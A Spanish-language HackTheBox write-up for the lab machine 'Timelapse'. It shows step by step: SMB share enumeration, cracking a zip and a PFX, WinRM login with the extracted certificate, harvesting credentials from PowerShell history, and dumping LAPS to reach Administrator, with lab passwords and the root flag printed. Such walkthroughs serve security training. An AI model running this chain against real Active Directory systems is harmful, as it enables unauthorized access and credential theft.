---
layout: default
title: Timelapse
parent: HackTheBox
grand_parent: Writeups
---

# Timelapse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Tenemos el puerto del SMB abierto donde descubriremos el archivo **winrm_backup.zip** que tiene contraseña pero la crackearemos y el descomprimir nos dejara el archivo **legacyy_dev_auth.pfx** que tambien tiene contraseña, asi que la volvemos a crackear y usando **openssl** extraeremos el certificado y una clave privada con la cual nos podemos conectar como el usuario **legacyy** por **EvilWinRM**, despues enumeraremos un poco y encontraremos el historial de powershell que contiene credenciales para el usuario **svc_deploy**, veremos que ese usuario pertece el grupo **LAPS_Readers** asi que dumpearemos **LAPS** usando **crackmapexec** para obtener las credenciales de **Administrator** y leer la flag en el directorio Desktop del usuario **TRX**

{:.lead}

## Enumeracion

Iniciamos con un escaneo de nmap con:

```ruby
nmap -sS -n -Pn -T4 --open -p- 10.10.11.152
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```ruby
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
52085/tcp open  unknown
```

Los de interes podrian ser:

- **53**: DNS
- **88**: Protocolo de autenticacion Kerberos
- **139/445**: NetBIOS-SSN/Microsoft-DS - SMB y NetBIOS
- **5986**: WinRM por SSL (lo usaremos mas adelante)

Podriamos hacer un escaneo para sacar mas informacion sobre las versiones y servicios que esten corriendo en esos puertos, pero en este caso omitiremos eso por que no hara falta

### Enumeracion SMB

De primeras podemos usar **crackmapexec** sobre SMB para obtener informacion inicial sobre el servicio SMB de la maquina:

```ruby
crackmapexec smb 10.10.11.152
```

Y esto nos arroja:

![](/assets/img/timelapse/1.png)

Podemos ver que el nombre es **DC01**, el dominio es **timelapse.htb**, la version de windows, y que no se usa **SMBv1**, con esta informacion sabemos que estamos contra un **Domain Controller** en un entorno de **AD**

Para hacer las cosas mas faciles podemos editar el **/etc/hosts** para indicarle que el dominio **timelapse.htb** se resuelva a la IP **10.10.11.152**

Para seguir enumerando podemos usar **crackmapexec**, **smbmap**, **smbclient** o **impacket-smbclient**, en mi caso usare de nuevo **crackmapexec** para enumerar recursos compartidos por SMB:

```ruby
crackmapexec smb timelapse.htb -u 'c4rta' -p '' --shares
```

Esto nos arroja:

![](/assets/img/timelapse/2.png)

Vemos que tenemos permisos de lectura en dos recursos

- **IPC$**: Recurso para la comunicacion o intercomunicacion de procesos
- **Shares**: Comunmente usado para compartir archivos

Ahora nos conectaremos al recurso **shares** usando **smbclient** para explorar su contenido

```ruby
smbclient //timelapse.htb/Shares -N
```

Despues de ver un poco, en el directorio **\timelapse.htb\Shares\Dev** encontraremos un comprimido llamado **winrm_backup.zip**, asi que usando **get winrm_backup.zip** nos lo descargaremos a nuestra maquina

Adicionalmente en el directorio **HelpDesk** podemos encontrar archivos de **LAPS**

![](/assets/img/timelapse/3.png)

LAPS significa **Local Administrator Password Solution** y proporciona administracion de cuentas locales para un dominio

### Cracking winrm_backup

Si intentamos descomprimirlo veremos que nos pide contraseña:

```ruby
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

Evidentemente no sabemos la contraseña, y como es un archivo zip, podemos usar **zip2john** para luego crackearlo con John

```ruby
zip2john winrm_backup.zip > hash
```

```ruby
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Y ahora tenemos la contraseña: **supremelegacy**, y si extraimos tenemos un archivo pfx

### Cracking PFX

Un archivo PFX contiene una copia de seguridad de una clave privada y un certificado, les puedo adelantar que con este certificado y clave privada nos podremos conectar por WinRM por el puerto **5986** que es el que usa SSL, asi que usando **openssl** podemos extraer ese certificado y esa clave privada.

Si intentamos extraer la clave usando openssl:

```ruby
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

Nos pedira una contraseña, si ingresamos la de **supremelegacy** nos dira que es incorrecta, asi que podemos probar con **pfx2john** para sacar el hash y luego crackearlo (otra forma es usar **crackpkcs12**)

```ruby
pfx2john legacyy_dev_auth.pfx > hashPfx
```

```ruby
john --wordlist=/usr/share/wordlists/rockyou.txt hashPfx
```

Y tenemos la contraseña: **thuglegacy**, ahora ya podemos sacar el certificado y la clave:

```ruby
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

```ruby
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

Ahora ya nos podemos conectar con **EvilWinRM** con SSL

```ruby
evil-winrm -S -i timelapse.htb -c cert.pem -k key.pem 
```

Y ya somos **legacyy**

![](/assets/img/timelapse/4.png)


### legacyy --> svc_deploy

Si empezamos a enumerar, podemos ver que si listamos los usuarios en el sistema con el comando **net user** podemos ver varios:

```ruby
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
```

El que nos va a interesar es **svc_deploy**, si vemos mas informacion con el comando **net user svc_deploy**:

```ruby
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Vemos que forma en el grupo **LAPS_Readers**, eso quiere decir que posiblemente el usuario **svc_deploy** tiene permisos para leer el contenido de LAPS, asi que una buena idea seria convertirnos en ese usuario, en este punto de pura enumeracion, y una de las cosas que se pueden hacer es ver el historial de powershell de **svc_deploy**, esto lo podemos hacer automaticamente usando **WinPeas**.

El historial de powershell se almacena en **C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt**, si lo leemos podemos ver que ha ejecutado varios comandos

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Observa que en la variable **$p** se le esta asignando el valor de **E3R$Q62^12p7PLlC%KWaxuaV**, pero hace uso de **ConvertTo-SecureString** para cifrar ese string, y despues con  **System.Management.Automation.PSCredential** le esta asignando la contraseña almacenada en **$p** al usuario **svc_deploy**, y esa contraseña es **E3R$Q62^12p7PLlC%KWaxuaV**, como el usuario **svc_deploy** pertecene el grupo **Remote Management Use** nos podemos conectar usando **EvilWinRM** con SSL

```ruby
evil-winrm -S -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

### Escalada de privilegios

Recordemos que **svc_deploy** pertecene al grupo **LAPS_Readers**, asi que es muy probable que podamos ver el contenido de LAPS, aqui hare una pausa, hay varias maneras de dumpear LAPS, podemos usar **Get-LAPSPasswords.ps1**, simplemente nos conectamos con **EvilWinRM** como **svc_deploy** y despues nos pasamos **Get-LAPSPasswords.ps1** y lo ejecutamos, o podemos usar **crackmapexec** con el modulo de **ldap**:

```ruby
crackmapexec ldap timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
```

```ruby
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        timelapse.htb   389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        timelapse.htb   389    DC01             [*] Getting LAPS Passwords
LAPS        timelapse.htb   389    DC01             Computer: DC01$                Password: 3s:apT2HA9i(M2Q@8Jh8r0c@w1
```

(la contraseña es diferente para cada usuario)

La contraseña es: **3s:apT2HA9i(M2Q@8Jh8r0c@w1**

Ahora solo nos queda conectarnos por **EvilWinRM** como el usuario **Administrator** y ya

```ruby
evil-winrm -S -i timelapse.htb -u Administrator -p '3s:apT2HA9i(M2Q@8Jh8r0c@w1'
```

Para no poner mas capturas, la flag no esta en directorio Desktop de Administrator, si recuerdas, cuando enumeramos usuarios, existia uno llamado **TRX** que tambien pertenece a Domain Admins, asi que la flag esta en el directorio desktop de ese usuario, y solo hace falta leerla con:

```ruby
type C:\Users\TRX\Desktop\root.tx
```

```ruby
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\TRX\Desktop\root.txt
7f573da830f9bc884f3afcec7a23cdc7
```

Eso ha sido todo, gracias por leer ❤